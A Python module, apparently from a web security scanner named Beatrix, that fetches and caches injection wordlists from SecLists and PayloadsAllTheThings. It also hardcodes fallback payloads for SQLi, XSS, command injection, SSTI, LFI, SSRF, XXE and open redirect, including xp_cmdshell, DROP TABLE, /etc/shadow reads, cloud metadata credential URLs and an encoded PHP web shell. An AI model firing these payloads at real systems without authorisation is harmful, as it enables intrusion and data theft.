"""
SecLists Manager — Dynamic Wordlist Fetcher for Beatrix
=========================================================

Dynamically fetches comprehensive injection wordlists from authoritative
GitHub repositories (SecLists, PayloadsAllTheThings, fuzzdb, etc.) and
caches them locally for repeated use.

This is the missing piece that makes Beatrix's injection scanning truly
comprehensive — thousands of curated payloads instead of a handful of basics.

Architecture:
    ┌───────────────────────────────────────────────────────┐
    │  SecListsManager                                      │
    │  ┌────────────┐  ┌────────────┐  ┌─────────────────┐  │
    │  │ Remote     │→ │  Local     │→ │  Payload        │  │
    │  │ Fetcher    │  │  Cache     │  │  Provider       │  │
    │  │ (GitHub)   │  │  (~/.cache)│  │  (get_wordlist) │  │
    │  └────────────┘  └────────────┘  └─────────────────┘  │
    └───────────────────────────────────────────────────────┘

Usage:
    from beatrix.core.seclists_manager import SecListsManager, get_manager

    mgr = get_manager()
    xss_payloads = mgr.get_wordlist("Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt")
    sqli_payloads = mgr.get_wordlist("Fuzzing/Databases/SQLi/Generic-SQLi.txt")

    # Or fetch all injection payloads at once
    all_injection = mgr.get_all_injection_payloads()
"""

import hashlib
import os
import time
import urllib.request
import urllib.error
from pathlib import Path
from typing import Dict, List, Optional, Set

# =============================================================================
# CONSTANTS
# =============================================================================

# Base URLs for raw file access on GitHub
GITHUB_RAW_BASES = {
    "seclists": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/",
    "payloads_all_the_things": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/",
    "fuzzdb": "https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/",
}

# Default cache directory
DEFAULT_CACHE_DIR = Path.home() / ".cache" / "beatrix" / "wordlists"

# Cache TTL: 7 days (wordlists don't change that often)
CACHE_TTL_SECONDS = 7 * 24 * 3600

# Maximum fetch timeout per file (seconds)
FETCH_TIMEOUT = 30

# ─────────────────────────────────────────────────────────────────────────────
# Comprehensive wordlist catalog — maps logical paths to GitHub raw URLs
# These map ONLY when a path needs redirection to a different repo/location.
# Paths that exist directly in SecLists don't need entries here — the fallback
# in _resolve_url will construct the correct raw URL automatically.
# ─────────────────────────────────────────────────────────────────────────────

WORDLIST_CATALOG: Dict[str, str] = {
    # Only add entries when the logical path does NOT exist at that exact
    # location in SecLists and needs to be redirected elsewhere.
}

# ─────────────────────────────────────────────────────────────────────────────
# Direct URL catalog — for wordlists that need exact URLs
# ─────────────────────────────────────────────────────────────────────────────

DIRECT_URL_CATALOG: Dict[str, str] = {
    # ── SQL Injection ────────────────────────────────────────────────────
    # SecLists — comprehensive SQLi wordlists (verified paths)
    "sqli_generic":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/Generic-SQLi.txt",
    "sqli_quick":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/quick-SQLi.txt",
    "sqli_auth_bypass_seclists":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt",
    "sqli_polyglots":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/SQLi-Polyglots.txt",
    "sqli_mysql_fuzzdb":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/MySQL.fuzzdb.txt",
    "sqli_mysql_login_bypass":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/MySQL-SQLi-Login-Bypass.fuzzdb.txt",
    "sqli_mssql":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/MSSQL.fuzzdb.txt",
    "sqli_oracle":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/Oracle.fuzzdb.txt",
    "sqli_nosql":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/NoSQL.txt",
    "sqli_blind":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/Generic-BlindSQLi.fuzzdb.txt",

    # ── XSS ──────────────────────────────────────────────────────────────
    # SecLists — human-friendly (full subdirectory path)
    "xss_brutelogic":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt",
    "xss_portswigger":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/human-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
    "xss_jhaddix":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt",
    "xss_rsnake":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/human-friendly/XSS-RSNAKE.txt",
    "xss_with_context":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/human-friendly/XSS-With-Context-Jhaddix.txt",
    "xss_somdev":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/human-friendly/XSS-Somdev.txt",
    "xss_payloadbox":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/human-friendly/XSS-payloadbox.txt",
    "xss_ofjaaah":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/human-friendly/XSS-OFJAAAH.txt",
    # Polyglots
    "xss_polyglots":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/Polyglots/XSS-Polyglots.txt",
    "xss_polyglot_0xsobky":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt",

    # ── LFI / Path Traversal ────────────────────────────────────────────
    "lfi_jhaddix":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt",
    "lfi_linux":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
    "lfi_windows":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt",
    "lfi_linux_packages":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt",

    # ── Command Injection ────────────────────────────────────────────────
    "cmdi_commix":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/command-injection-commix.txt",

    # ── SSTI ─────────────────────────────────────────────────────────────
    "ssti_payloads":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/template-engines-special-vars.txt",

    # ── NoSQL Injection (SecLists) ────────────────────────────────────────
    "nosqli_seclists":
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/SQLi/NoSQL.txt",

    # ═══════════════════════════════════════════════════════════════════════
    # PayloadsAllTheThings — Intruder wordlists
    # https://github.com/swisskyrepo/PayloadsAllTheThings
    # ═══════════════════════════════════════════════════════════════════════

    # ── PATT: SQL Injection ──────────────────────────────────────────────
    "patt_sqli_auth_bypass":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass.txt",
    "patt_sqli_auth_bypass2":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass2.txt",
    "patt_sqli_fuzzdb_mssql_time":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZDB_MSSQL-WHERE_Time.txt",
    "patt_sqli_fuzzdb_mssql":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZDB_MSSQL.txt",
    "patt_sqli_fuzzdb_mssql_enum":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt",
    "patt_sqli_fuzzdb_mysql":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZDB_MYSQL.txt",
    "patt_sqli_fuzzdb_mysql_time":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZDB_MySQL-WHERE_Time.txt",
    "patt_sqli_fuzzdb_mysql_read":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZDB_MySQL_ReadLocalFiles.txt",
    "patt_sqli_fuzzdb_oracle":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZDB_Oracle.txt",
    "patt_sqli_fuzzdb_postgres":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/FUZZDB_Postgres_Enumeration.txt",
    "patt_sqli_error_based":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Generic_ErrorBased.txt",
    "patt_sqli_fuzz":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Generic_Fuzz.txt",
    "patt_sqli_time_based":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Generic_TimeBased.txt",
    "patt_sqli_union_select":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Generic_UnionSelect.txt",
    "patt_sqli_polyglots":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/SQLi_Polyglots.txt",

    # ── PATT: XSS Injection ──────────────────────────────────────────────
    "patt_xss_event_handlers":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/0xcela_event_handlers.txt",
    "patt_xss_brutelogic_js":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/BRUTELOGIC-XSS-JS.txt",
    "patt_xss_brutelogic_strings":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt",
    "patt_xss_intruders":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/IntrudersXSS.txt",
    "patt_xss_jhaddix":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/JHADDIX_XSS.txt",
    "patt_xss_mario":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/MarioXSSVectors.txt",
    "patt_xss_rsnake":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/RSNAKE_XSS.txt",
    "patt_xss_detection":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/XSSDetection.txt",
    "patt_xss_polyglots":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/XSS_Polyglots.txt",
    "patt_xss_jsonp":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/jsonp_endpoint.txt",
    "patt_xss_portswigger_events":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/port_swigger_xss_cheatsheet_event_handlers.txt",
    "patt_xss_alert":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/xss_alert.txt",
    "patt_xss_alert_identifiable":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/xss_alert_identifiable.txt",
    "patt_xss_quick":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/xss_payloads_quick.txt",
    "patt_xss_swf":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/xss_swf_fuzz.txt",

    # ── PATT: Command Injection ──────────────────────────────────────────
    "patt_cmdi_unix":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/Intruder/command-execution-unix.txt",
    "patt_cmdi_exec":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/Intruder/command_exec.txt",

    # ── PATT: Directory Traversal / LFI ──────────────────────────────────
    "patt_traversal_deep":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/deep_traversal.txt",
    "patt_traversal_basic":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/directory_traversal.txt",
    "patt_traversal_dotdotpwn":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/dotdotpwn.txt",
    "patt_traversal_exotic":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/traversals-8-deep-exotic-encoding.txt",

    # ── PATT: File Inclusion (LFI/RFI) ───────────────────────────────────
    "patt_lfi_bsd":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/BSD-files.txt",
    "patt_lfi_jhaddix":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/JHADDIX_LFI.txt",
    "patt_lfi_fd_check":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/LFI-FD-check.txt",
    "patt_lfi_windows_check":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/LFI-WindowsFileCheck.txt",
    "patt_lfi_linux":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Linux-files.txt",
    "patt_lfi_files_list":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/List_Of_File_To_Include.txt",
    "patt_lfi_files_null":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/List_Of_File_To_Include_NullByteAdded.txt",
    "patt_lfi_mac":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Mac-files.txt",
    "patt_lfi_traversal":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Traversal.txt",
    "patt_lfi_web":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Web-files.txt",
    "patt_lfi_windows":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Windows-files.txt",
    "patt_lfi_dotslash":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/dot-slash-PathTraversal_and_LFI_pairing.txt",
    "patt_lfi_php_filter":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/php-filter-iconv.txt",
    "patt_lfi_simple":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/simple-check.txt",

    # ── PATT: NoSQL Injection ────────────────────────────────────────────
    "patt_nosqli_mongodb":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/Intruder/MongoDB.txt",
    "patt_nosqli_nosql":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/Intruder/NoSQL.txt",

    # ── PATT: LDAP Injection ─────────────────────────────────────────────
    "patt_ldap_fuzz":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt",
    "patt_ldap_fuzz_small":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ_SMALL.txt",
    "patt_ldap_attributes":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt",

    # ── PATT: XXE Injection ──────────────────────────────────────────────
    "patt_xxe_fuzzing":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/Intruders/XXE_Fuzzing.txt",
    "patt_xxe_attacks":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/Intruders/xml-attacks.txt",

    # ── PATT: Open Redirect ──────────────────────────────────────────────
    "patt_redirect_payloads":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/Intruder/Open-Redirect-payloads.txt",
    "patt_redirect_wordlist":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/Intruder/open_redirect_wordlist.txt",
    "patt_redirect_openredirects":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Open%20Redirect/Intruder/openredirects.txt",

    # ── PATT: Insecure Management / Spring Boot ──────────────────────────
    "patt_springboot_actuator":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Insecure%20Management%20Interface/Intruder/springboot_actuator.txt",

    # ── PATT: Web Cache Deception ────────────────────────────────────────
    "patt_cache_headers":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Web%20Cache%20Deception/Intruders/param_miner_lowercase_headers.txt",

    # ── PATT: CRLF Injection ─────────────────────────────────────────────
    "patt_crlf":
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/CRLF%20Injection/Files/crlfinjection.txt",
}

# ─────────────────────────────────────────────────────────────────────────────
# Bundled fallback payloads — hardcoded so we never have zero payloads
# even if all network fetches fail
# ─────────────────────────────────────────────────────────────────────────────

FALLBACK_PAYLOADS: Dict[str, List[str]] = {
    "sqli": [
        "'", "''", "\"", "'--", "'#", "' OR '1'='1", "' OR '1'='1'--",
        "' OR 1=1--", "' OR ''='", "admin'--", "1' ORDER BY 1--",
        "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
        "' AND 1=1--", "' AND 1=2--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        "') OR ('1'='1", "') OR 1=1--", "'; EXEC xp_cmdshell('id')--",
        "' WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR pg_sleep(5)--", "1 OR 1=1", "1' OR '1'='1",
        "' UNION SELECT username,password FROM users--",
        "1;SELECT * FROM information_schema.tables--",
        "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
        "-1' UNION SELECT 1,2,3--", "' AND BENCHMARK(10000000,SHA1('test'))--",
        "1; DROP TABLE users--", "' AND ASCII(SUBSTRING(@@version,1,1))>0--",
        "' OR SLEEP(5)#", "\" OR \"\"=\"", "' OR 'x'='x",
        "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "\"><script>alert(1)</script>",
        "javascript:alert(1)", "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>", "{{7*7}}", "${7*7}",
        "'-alert(1)-'", "<svg/onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>", "<img/src=x onerror=alert(1)>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "\"><svg/onload=alert(1)>", "<details open ontoggle=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">", "<object data=\"javascript:alert(1)\">",
        "<marquee onstart=alert(1)>", "<isindex type=image src=1 onerror=alert(1)>",
        "<video><source onerror=\"javascript:alert(1)\">",
        "<input type=\"text\" onfocus=\"alert(1)\" autofocus>",
        "<select autofocus onfocus=alert(1)>", "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>", "<audio src=x onerror=alert(1)>",
        "'\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        "<table background=\"javascript:alert(1)\">",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<div style=\"width:expression(alert(1))\">",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0d%%0a<svg/%%0bonload=alert(1)//>",
    ],
    "cmdi": [
        "; id", "| id", "|| id", "&& id", "`id`", "$(id)",
        "; sleep 5", "| sleep 5", "&& sleep 5",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "& ping -c 5 127.0.0.1 &", "() { :; }; echo vulnerable",
        "; echo vulnerable", "| echo vulnerable",
        "$(sleep 5)", "`sleep 5`",
        "a]]; cat /etc/passwd", "a]]; id",
        "%0a id", "%0A id", "\\n id", "\\r\\n id",
        ";${IFS}id", ";$IFS'id'", ";{id}", "$({id})",
        "{{7*7}}", "a]]; sleep 5", "& whoami",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{7*'7'}}", "${{7*7}}", "{{config}}",
        "{{config.items()}}", "{{self.__init__.__globals__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "{{constructor.constructor('return this')()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{91371*91373}}", "${91371*91373}", "<%= 91371*91373 %>",
        "#{91371*91373}", "{{\"foo\".__class__.__base__}}",
        "{{[].__class__.__base__.__subclasses__()}}",
        "{{lipsum.__globals__[\"os\"].popen(\"id\").read()}}",
    ],
    "lfi": [
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "/etc/passwd", "..\\..\\..\\windows\\win.ini",
        "/proc/self/environ", "../../../../../../etc/passwd",
        "..%252f..%252f..%252fetc/passwd", "..%c0%af..%c0%af..%c0%afetc/passwd",
        "....//....//....//....//etc/passwd",
        "/etc/passwd%00", "../../../../../../etc/passwd%00",
        "/var/log/apache2/access.log", "/var/log/auth.log",
        "/proc/self/cmdline", "/proc/version",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input", "expect://id",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "file:///etc/passwd", "/etc/shadow",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://[::1]", "http://0.0.0.0",
        "http://0177.0.0.1", "http://0x7f000001",
        "http://2130706433", "http://017700000001",
        "file:///etc/passwd", "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:25/", "http://127.1",
        "http://0/", "http://localtest.me",
    ],
    "nosqli": [
        "' || '1'=='1", "{\"$gt\":\"\"}", "{\"$ne\":\"\"}", "{\"$regex\":\".*\"}",
        "true, $where: '1 == 1'", "'; return true; var a='",
        "{\"username\":{\"$gt\":\"\"}, \"password\":{\"$gt\":\"\"}}",
        "[$ne]=1", "[$gt]=", "[$regex]=.*",
        "{\"$where\":\"sleep(5000)\"}", "'; sleep(5000); '",
        "{\"$or\":[{},{}]}", "admin' || '' == '",
    ],
    "ldap": [
        "*", "*)(&", "*)(|(&", "pwd)", "*)(|(*",
        "*))%00", "*()|%26'", "admin)(&)", "admin ## ",
        "*(|(mail=*))", "*(|(objectclass=*))", "*)(uid=*))(|(uid=*",
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1\">]><foo>&xxe;</foo>",
        "<![CDATA[<script>alert(1)</script>]]>",
        "<?xml version=\"1.0\"?><!DOCTYPE bar [<!ENTITY xxe SYSTEM \"/dev/random\">]><bar>&xxe;</bar>",
    ],
    "redirect": [
        "//evil.com", "/\\evil.com", "https://evil.com",
        "//evil.com/%2f..", "/redirect?url=//evil.com",
        "///evil.com", "////evil.com",
        "https:evil.com", "http://evil.com",
        "\\.evil.com", "/evil.com", "//evil%E3%80%82com",
    ],
    "crlf": [
        "%0d%0aHeader-Injected:true", "%0aHeader-Injected:true",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "\\r\\nHeader-Injected:true", "%E5%98%8A%E5%98%8D",
        "%0d%0aSet-Cookie:crlf=injected",
    ],
}


class SecListsManager:
    """
    Manages SecLists and other community wordlists.

    Downloads from GitHub raw URLs, caches locally, and provides
    a clean interface for consumers to get wordlist contents.
    """

    def __init__(
        self,
        cache_dir: Optional[Path] = None,
        cache_ttl: int = CACHE_TTL_SECONDS,
        verbose: bool = True,
    ):
        self.cache_dir = cache_dir or DEFAULT_CACHE_DIR
        self.cache_ttl = cache_ttl
        self.verbose = verbose

        # Ensure cache directory exists
        self.cache_dir.mkdir(parents=True, exist_ok=True)

        # In-memory cache for current session
        self._memory_cache: Dict[str, List[str]] = {}

        # Track fetch stats
        self._stats = {
            "fetched": 0,
            "cache_hits": 0,
            "errors": 0,
            "total_payloads": 0,
        }

    def _log(self, msg: str) -> None:
        """Print verbose message"""
        if self.verbose:
            print(f"    [SecLists] {msg}")

    def _resolve_url(self, path_or_key: str) -> Optional[str]:
        """Resolve a logical path or key to a raw GitHub URL."""

        # First check direct URL catalog
        if path_or_key in DIRECT_URL_CATALOG:
            return DIRECT_URL_CATALOG[path_or_key]

        # Check wordlist catalog (maps logical SecLists paths to repo:path)
        if path_or_key in WORDLIST_CATALOG:
            ref = WORDLIST_CATALOG[path_or_key]
            if ":" in ref:
                repo_key, rel_path = ref.split(":", 1)
                base = GITHUB_RAW_BASES.get(repo_key)
                if base:
                    return base + urllib.request.pathname2url(rel_path).lstrip("/")

        # Try direct SecLists path (most common usage)
        # URL-encode spaces in the path
        encoded_path = urllib.request.pathname2url(path_or_key).lstrip("/")
        return GITHUB_RAW_BASES["seclists"] + encoded_path

    def _cache_path(self, key: str) -> Path:
        """Get local cache file path for a key."""
        safe_name = hashlib.sha256(key.encode()).hexdigest()[:16] + ".txt"
        return self.cache_dir / safe_name

    def _is_cache_fresh(self, cache_file: Path) -> bool:
        """Check if cached file is still within TTL."""
        if not cache_file.exists():
            return False
        age = time.time() - cache_file.stat().st_mtime
        return age < self.cache_ttl

    def _fetch_url(self, url: str) -> Optional[str]:
        """Fetch content from a URL with timeout and error handling."""
        try:
            req = urllib.request.Request(
                url,
                headers={
                    "User-Agent": "Beatrix-SecLists-Fetcher/1.0",
                    "Accept": "text/plain",
                },
            )
            with urllib.request.urlopen(req, timeout=FETCH_TIMEOUT) as resp:
                if resp.status == 200:
                    return resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            self._log(f"HTTP {e.code} fetching {url}")
        except urllib.error.URLError as e:
            self._log(f"Network error fetching {url}: {e.reason}")
        except Exception as e:
            self._log(f"Error fetching {url}: {e}")
        return None

    def _parse_wordlist(self, content: str) -> List[str]:
        """Parse wordlist content into clean list of payloads."""
        lines = []
        for line in content.splitlines():
            line = line.strip()
            # Skip empty lines and comments
            if not line or line.startswith("#"):
                continue
            lines.append(line)
        return lines

    def get_wordlist(self, path: str) -> List[str]:
        """
        Get a wordlist by its logical path.

        Checks: memory cache → disk cache → remote fetch → fallback

        Args:
            path: Logical path like "Fuzzing/XSS/XSS-Jhaddix.txt"
                  or a direct key like "xss_jhaddix"

        Returns:
            List of payload strings (never empty — falls back to built-in)
        """
        # 1. Memory cache
        if path in self._memory_cache:
            self._stats["cache_hits"] += 1
            return self._memory_cache[path]

        # 2. Disk cache
        cache_file = self._cache_path(path)
        if self._is_cache_fresh(cache_file):
            try:
                content = cache_file.read_text(encoding="utf-8")
                payloads = self._parse_wordlist(content)
                if payloads:
                    self._memory_cache[path] = payloads
                    self._stats["cache_hits"] += 1
                    self._stats["total_payloads"] += len(payloads)
                    self._log(f"Cache hit: {path} ({len(payloads)} payloads)")
                    return payloads
            except Exception:
                pass

        # 3. Remote fetch
        url = self._resolve_url(path)
        if url:
            self._log(f"Fetching: {path}")
            content = self._fetch_url(url)
            if content:
                payloads = self._parse_wordlist(content)
                if payloads:
                    # Save to disk cache
                    try:
                        cache_file.write_text(content, encoding="utf-8")
                    except Exception:
                        pass

                    self._memory_cache[path] = payloads
                    self._stats["fetched"] += 1
                    self._stats["total_payloads"] += len(payloads)
                    self._log(f"Fetched: {path} ({len(payloads)} payloads)")
                    return payloads
                else:
                    self._stats["errors"] += 1

        # 4. Fallback — try to match to built-in category
        self._stats["errors"] += 1
        category = self._infer_category(path)
        if category and category in FALLBACK_PAYLOADS:
            fallback = FALLBACK_PAYLOADS[category]
